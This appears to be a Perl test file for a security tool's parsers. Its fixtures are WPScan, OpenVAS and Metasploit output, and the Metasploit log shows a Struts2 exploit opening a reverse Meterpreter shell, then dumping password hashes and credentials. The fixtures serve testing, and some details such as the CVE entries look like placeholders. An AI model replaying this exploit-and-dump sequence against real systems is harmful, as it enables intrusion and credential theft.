#!/usr/bin/env perl
#
# Testes para os parsers do FydelisAI
# =====================================

use v5.20;
use strict;
use warnings;
use FindBin;
use lib "$FindBin::RealBin/../lib";
use FydelisAI::Parser;
use FydelisAI::Config;
use FydelisAI::Logger;

my $config = FydelisAI::Config->new(verbose => 0);
my $logger = FydelisAI::Logger->new(level => 5);  # NONE
my $parser = FydelisAI::Parser->new(config => $config, logger => $logger);

my $tests_run    = 0;
my $tests_passed = 0;

sub test {
    my ($name, $got, $expected, $compare_key) = @_;

    $tests_run++;

    my $equal = 0;
    if (ref $expected eq 'ARRAY') {
        $equal = scalar($got->@*) == scalar($expected->@*);
    } elsif (ref $expected eq 'HASH') {
        $equal = 1;
        for my $k (keys %$expected) {
            if ($compare_key) {
                $equal &&= $got->{$k} eq $expected->{$k};
            } else {
                $equal &&= $got->{$k} eq $expected->{$k};
            }
        }
    } else {
        $equal = $got eq $expected;
    }

    if ($equal) {
        $tests_passed++;
        print "  ✅ $name\n";
    } else {
        print "  ❌ $name\n";
        print "      Esperado: " . (ref $expected ? JSON::encode_json($expected) : $expected) . "\n";
        print "      Recebido: " . (ref $got ? JSON::encode_json($got) : $got) . "\n";
    }
}

# ═══════════════════════════════════════════════════════════
# WPSCAN TESTS
# ═══════════════════════════════════════════════════════════

my $wpscan_output = <<'WPSCAN';
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___
           \ \/  \/ / |  ___/ \___ \
            \  /\  /  | |     ____) |
             \/  \/   |_|    |_____/
         WordPress Security Scanner
_______________________________________________________________

[+] URL: http://target.com/ [10.0.0.1]
[+] Started: 2024-01-15 14:30:00

[+] WordPress version 6.4.1 identified (Releases, released on 2023-11-08).

[+] WordPress theme in use: twentytwentyfour

[+] Enumerating Plugins (via Passive Detection)
[+] Plugin(s): akismet, contact-form-7, woocommerce

[+] Plugin: akismet [v4.3.0] [vulnerable]
    | CVE-2023-1234
    | Severity: HIGH
    | Description: SQL Injection in akismet plugin

[+] Plugin: contact-form-7 [v5.8.3] [vulnerable]
    | CVE-2023-5678
    | Severity: CRITICAL
    | Description: Unauthenticated file upload

[+] Plugin: woocommerce [v8.2.0]

[+] User(s): admin, editor, subscriber

[+] User: admin
    | Found by author id: 1

[+] Interesting file: /wp-content/uploads/
[+] Interesting file: /wp-admin/admin-ajax.php

[+] Timthumb: /wp-content/themes/twentytwentyfour/timthumb.php
WPSCAN

my $wpscan_result = $parser->parse_wpscan($wpscan_output);

test("WPScan: versão",      $wpscan_result->{wordpress_version}, '6.4.1');
test("WPScan: tema",        $wpscan_result->{wordpress_theme}, 'twentytwentyfour');
test("WPScan: plugins",     scalar $wpscan_result->{plugins}->@*, 3);
test("WPScan: users",       scalar $wpscan_result->{users}->@*, 3);

# ═══════════════════════════════════════════════════════════
# OPENVAS TESTS
# ═══════════════════════════════════════════════════════════

my $openvas_xml = <<'OPENVAS';
<?xml version="1.0"?>
<report id="abc123">
  <results>
    <result>
      <name>Apache HTTP Server Version</name>
      <description>Apache 2.4.49 is vulnerable to path traversal (CVE-2021-41773)</description>
      <threat>High</threat>
      <port>80/tcp</port>
      <cvss_base>7.5</cvss_base>
      <solution>Upgrade Apache to version 2.4.51 or later</solution>
      <nvt>
        <oid>1.3.6.1.4.1.25623.1.0.123456</oid>
      </nvt>
    </result>
    <result>
      <name>OpenSSH Weak Key Exchange Algorithms</name>
      <description>SSH server allows weak key exchange algorithms</description>
      <threat>Medium</threat>
      <port>22/tcp</port>
      <cvss_base>4.3</cvss_base>
      <solution>Disable weak key exchange algorithms in sshd_config</solution>
      <nvt>
        <oid>1.3.6.1.4.1.25623.1.0.789012</oid>
      </nvt>
    </result>
    <result>
      <name>TCP Timestamp Information Disclosure</name>
      <description>The remote host responds to TCP timestamp requests</description>
      <threat>Low</threat>
      <port>general/tcp</port>
      <cvss_base>2.6</cvss_base>
      <solution>N/A</solution>
    </result>
  </results>
</report>
OPENVAS

my $openvas_result = $parser->parse_openvas($openvas_xml);

test("OpenVAS: total resultados XML", scalar $openvas_result->{results}->@*, 3);
test("OpenVAS: primeiro resultado nome", $openvas_result->{results}->[0]{name}, 'Apache HTTP Server Version');
test("OpenVAS: primeiro resultado severity", $openvas_result->{results}->[0]{severity}, 'HIGH');
test("OpenVAS: primeiro resultado CVE via desc", 
     $openvas_result->{results}->[0]{description} =~ /CVE-2021-41773/ ? 1 : 0, 1);

# ═══════════════════════════════════════════════════════════
# METASPLOIT TESTS
# ═══════════════════════════════════════════════════════════

my $msf_output = <<'METASPLOIT';
msf6 > use exploit/multi/http/struts2_content_type
msf6 exploit(multi/http/struts2_content_type) > set RHOSTS 192.168.1.100
msf6 exploit(multi/http/struts2_content_type) > set RPORT 8080
msf6 exploit(multi/http/struts2_content_type) > exploit

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Sending stage (123456 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:54321)
[*] Session 1 created.

msf6 exploit(multi/http/struts2_content_type) > sessions

Active sessions
===============

  Id  Name  Type                     Transport      Info              Connection
  --  ----  ----                     ---------      ----              ----------
  1         meterpreter x64/linux    tcp            www-data @ host    192.168.1.50:4444 -> 192.168.1.100:54321

msf6 exploit(multi/http/struts2_content_type) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > hashdump
[*] Dumping password hashes from host...

admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

meterpreter > creds all
[+] Found credential: admin:password123

meterpreter > loot
Loot: /root/.msf4/loot/202401151430_default_192.168.1.100_passwords.txt
METASPLOIT

my $msf_result = $parser->parse_metasploit($msf_output);

test("Metasploit: sessions",       scalar $msf_result->{sessions}->@*, 2);
test("Metasploit: módulo load",    $msf_result->{modules_loaded} > 0 ? 1 : 0, 1);
test("Metasploit: credenciais",    scalar $msf_result->{credentials}->@* > 0 ? 1 : 0, 1);
test("Metasploit: target rhost",   $msf_result->{targets}->@* > 0 ? 1 : 0, 1);
test("Metasploit: loot",           scalar $msf_result->{loot}->@* > 0 ? 1 : 0, 1);

# ═══════════════════════════════════════════════════════════
# RESUMO
# ═══════════════════════════════════════════════════════════

my $total = scalar keys %{ { map { $_ => 1 } qw(WPScan OpenVAS Metasploit) } };
print "\n" . "=" x 60 . "\n";
print "Testes: $tests_passed / $tests_run passaram\n";
print "=" x 60 . "\n";
exit($tests_passed == $tests_run ? 0 : 1);